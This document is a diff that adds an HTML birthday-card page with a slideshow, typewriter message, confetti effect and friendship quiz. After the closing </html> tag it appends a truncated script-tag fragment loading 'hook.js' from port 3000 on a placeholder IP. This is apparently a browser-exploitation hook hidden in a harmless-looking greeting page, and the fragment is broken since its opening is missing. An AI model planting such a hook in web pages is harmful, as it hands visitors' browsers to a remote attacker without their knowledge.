@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HAPPY BIRTHDAY [FRIEND'S NAME]! 🎉</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Pacifico&family=Montserrat:wght@400;700&display=swap');
+        
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Montserrat', sans-serif;
+            background: linear-gradient(135deg, #ff9a9e, #fad0c4);
+            color: #fff;
+            overflow-x: hidden;
+            text-align: center;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        h1 {
+            font-family: 'Pacifico', cursive;
+            font-size: 3.5em;
+            margin: 20px 0;
+            text-shadow: 3px 3px 0 #ff6b6b;
+            animation: glow 2s infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 0 0 10px #fff, 0 0 20px #ff6b6b; }
+            to { text-shadow: 0 0 20px #fff, 0 0 30px #ff6b6b; }
+        }
+        
+        .birthday-card {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            margin: 30px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .photo-slider {
+            width: 300px;
+            height: 300px;
+            margin: 0 auto;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 5px solid #fff;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+        
+        .photo-slider img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+        
+        .photo-slider img.active {
+            display: block;
+            animation: fadeIn 1s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .message {
+            font-size: 1.2em;
+            line-height: 1.8;
+            margin: 25px 0;
+            min-height: 150px;
+        }
+        
+        .typewriter {
+            border-right: 3px solid #fff;
+            white-space: nowrap;
+            overflow: hidden;
+            display: inline-block;
+            animation: blink 0.75s step-end infinite;
+        }
+        
+        @keyframes blink {
+            from, to { border-color: transparent }
+            50% { border-color: #fff }
+        }
+        
+        button {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 1.1em;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 15px 10px;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
+        }
+        
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 107, 107, 0.6);
+        }
+        
+        .quiz {
+            display: none;
+            text-align: left;
+            background: rgba(255, 255, 255, 0.3);
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 20px;
+        }
+        
+        .quiz-question {
+            margin-bottom: 15px;
+        }
+        
+        .quiz-option {
+            margin: 8px 0;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 8px;
+            transition: background 0.3s;
+        }
+        
+        .quiz-option:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .balloon {
+            position: absolute;
+            width: 40px;
+            height: 50px;
+            background: #ff6b6b;
+            border-radius: 50%;
+            opacity: 0.7;
+            z-index: -1;
+            animation: float 8s infinite ease-in;
+        }
+        
+        .balloon:nth-child(2n) {
+            background: #74b9ff;
+        }
+        
+        .balloon:nth-child(3n) {
+            background: #55efc4;
+        }
+        
+        .balloon:nth-child(4n) {
+            background: #ffeaa7;
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(100vh) scale(0.8); }
+            100% { transform: translateY(-100px) scale(1.2); }
+        }
+        
+        footer {
+            margin-top: 40px;
+            font-style: italic;
+            color: rgba(255, 255, 255, 0.8);
+        }
+    </style>
+</head>
+<body>
+    <!-- Floating Balloons -->
+    <div class="balloon" style="left: 10%; animation-delay: 0s;"></div>
+    <div class="balloon" style="left: 20%; animation-delay: 2s;"></div>
+    <div class="balloon" style="left: 30%; animation-delay: 4s;"></div>
+    <div class="balloon" style="left: 40%; animation-delay: 1s;"></div>
+    <div class="balloon" style="left: 50%; animation-delay: 3s;"></div>
+    <div class="balloon" style="left: 60%; animation-delay: 5s;"></div>
+    <div class="balloon" style="left: 70%; animation-delay: 2s;"></div>
+    <div class="balloon" style="left: 80%; animation-delay: 4s;"></div>
+    <div class="balloon" style="left: 90%; animation-delay: 1s;"></div>
+    
+    <div class="container">
+        <h1>Happy Birthday, [FRIEND'S NAME]! 🎂</h1>
+        
+        <div class="birthday-card">
+            <!-- Photo Slideshow -->
+            <div class="photo-slider">
+                <img src="https://via.placeholder.com/300" alt="Photo 1" class="active">
+                <img src="https://via.placeholder.com/300" alt="Photo 2">
+                <img src="https://via.placeholder.com/300" alt="Photo 3">
+            </div>
+            
+            <!-- Personalized Message -->
+            <div class="message">
+                <div id="typed-message"></div>
+            </div>
+            
+            <!-- Buttons -->
+            <button id="confetti-btn">Shoot Confetti! 🎊</button>
+            <button id="quiz-btn">How Well Do You Know Me? ❤️</button>
+            
+            <!-- Quiz Section -->
+            <div class="quiz" id="quiz">
+                <h2>Quiz Time! Let's See How Well You Know Me 😉</h2>
+                <div class="quiz-question">
+                    <p>1. What's my favorite color?</p>
+                    <div class="quiz-option" data-correct="true">Blue</div>
+                    <div class="quiz-option">Pink</div>
+                    <div class="quiz-option">Black</div>
+                </div>
+                <div class="quiz-question">
+                    <p>2. What's my dream travel destination?</p>
+                    <div class="quiz-option">Paris</div>
+                    <div class="quiz-option" data-correct="true">Japan</div>
+                    <div class="quiz-option">New York</div>
+                </div>
+                <div class="quiz-question">
+                    <p>3. What's my go-to karaoke song?</p>
+                    <div class="quiz-option">Bohemian Rhapsody</div>
+                    <div class="quiz-option">Dancing Queen</div>
+                    <div class="quiz-option" data-correct="true">Love Story</div>
+                </div>
+                <button id="quiz-submit">Submit Answers</button>
+                <div id="quiz-result"></div>
+            </div>
+        </div>
+        
+        <footer>
+            Made with ❤️ by [YOUR NAME] - ©<span id="year"></span>
+        </footer>
+    </div>
+    
+    <!-- Birthday Music (Auto-plays) -->
+    <audio id="birthday-music" loop>
+        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+    </audio>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set current year
+            document.getElementById('year').textContent = new Date().getFullYear();
+            
+            // Auto-play music (muted first to bypass browser restrictions)
+            const music = document.getElementById('birthday-music');
+            music.volume = 0.5;
+            
+            // Some browsers require interaction before playing audio
+            document.body.addEventListener('click', function() {
+                music.play().catch(e => console.log("Auto-play prevented:", e));
+            }, { once: true });
+            
+            // Photo slideshow
+            const photos = document.querySelectorAll('.photo-slider img');
+            let currentPhoto = 0;
+            
+            setInterval(() => {
+                photos[currentPhoto].classList.remove('active');
+                currentPhoto = (currentPhoto + 1) % photos.length;
+                photos[currentPhoto].classList.add('active');
+            }, 3000);
+            
+            // Typewriter effect
+            const message = document.getElementById('typed-message');
+            const texts = [
+                "Dear [FRIEND'S NAME],",
+                "Wishing you the happiest birthday ever! 🎉",
+                "You're the most amazing friend anyone could ask for.",
+                "Thank you for all the laughter and memories.",
+                "May this year bring you joy, success, and lots of cake! 🍰",
+                "Love, [YOUR NAME] ❤️"
+            ];
+            
+            let textIndex = 0;
+            let charIndex = 0;
+            let isDeleting = false;
+            
+            function typeWriter() {
+                const currentText = texts[textIndex];
+                
+                if (isDeleting) {
+                    message.innerHTML = currentText.substring(0, charIndex - 1);
+                    charIndex--;
+                } else {
+                    message.innerHTML = currentText.substring(0, charIndex + 1);
+                    charIndex++;
+                }
+                
+                if (!isDeleting && charIndex === currentText.length) {
+                    isDeleting = true;
+                    setTimeout(typeWriter, 2000);
+                } else if (isDeleting && charIndex === 0) {
+                    isDeleting = false;
+                    textIndex = (textIndex + 1) % texts.length;
+                    setTimeout(typeWriter, 500);
+                } else {
+                    setTimeout(typeWriter, isDeleting ? 50 : 100);
+                }
+            }
+            
+            setTimeout(typeWriter, 1000);
+            
+            // Confetti button
+            document.getElementById('confetti-btn').addEventListener('click', function() {
+                createConfetti();
+            });
+            
+            function createConfetti() {
+                const colors = ['#ff6b6b', '#74b9ff', '#55efc4', '#ffeaa7', '#a29bfe'];
+                
+                for (let i = 0; i < 100; i++) {
+                    const confetti = document.createElement('div');
+                    confetti.style.position = 'fixed';
+                    confetti.style.width = '10px';
+                    confetti.style.height = '10px';
+                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                    confetti.style.borderRadius = '50%';
+                    confetti.style.left = Math.random() * 100 + 'vw';
+                    confetti.style.top = '-10px';
+                    confetti.style.zIndex = '1000';
+                    
+                    document.body.appendChild(confetti);
+                    
+                    const animation = confetti.animate([
+                        { top: '-10px', opacity: 1, transform: 'rotate(0deg)' },
+                        { top: '100vh', opacity: 0, transform: 'rotate(360deg)' }
+                    ], {
+                        duration: 2000 + Math.random() * 3000,
+                        easing: 'cubic-bezier(0.1, 0.8, 0.3, 1)'
+                    });
+                    
+                    animation.onfinish = () => confetti.remove();
+                }
+            }
+            
+            // Quiz toggle
+            document.getElementById('quiz-btn').addEventListener('click', function() {
+                const quiz = document.getElementById('quiz');
+                quiz.style.display = quiz.style.display === 'block' ? 'none' : 'block';
+            });
+            
+            // Quiz logic
+            document.getElementById('quiz-submit').addEventListener('click', function() {
+                const options = document.querySelectorAll('.quiz-option');
+                let correct = 0;
+                let answered = 0;
+                
+                options.forEach(option => {
+                    if (option.classList.contains('selected')) {
+                        answered++;
+                        if (option.dataset.correct === "true") correct++;
+                    }
+                });
+                
+                const result = document.getElementById('quiz-result');
+                if (answered < 3) {
+                    result.innerHTML = `<p style="color: #ffeaa7;">You only answered ${answered}/3 questions! Try again 😊</p>`;
+                } else {
+                    const percentage = Math.round((correct / 3) * 100);
+                    let message;
+                    
+                    if (percentage === 100) message = "Perfect! You know me better than I know myself! ❤️";
+                    else if (percentage >= 70) message = "Great job! You know me pretty well! 😊";
+                    else if (percentage >= 30) message = "Not bad! But we need to hang out more! 😉";
+                    else message = "Oof... Do you even know me? 😂";
+                    
+                    result.innerHTML = `
+                        <p>You got ${correct}/3 correct (${percentage}%)</p>
+                        <p><strong>${message}</strong></p>
+                    `;
+                }
+            });
+            
+            // Quiz option selection
+            document.querySelectorAll('.quiz-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    // Remove selection from siblings
+                    const siblings = this.parentNode.querySelectorAll('.quiz-option');
+                    siblings.forEach(sib => sib.classList.remove('selected'));
+                    
+                    // Select this option
+                    this.classList.add('selected');
+                });
+            });
+        });
+        
+    </script>
+</body>
+</html>
+http://<IP>:3000/hook.js"></script>
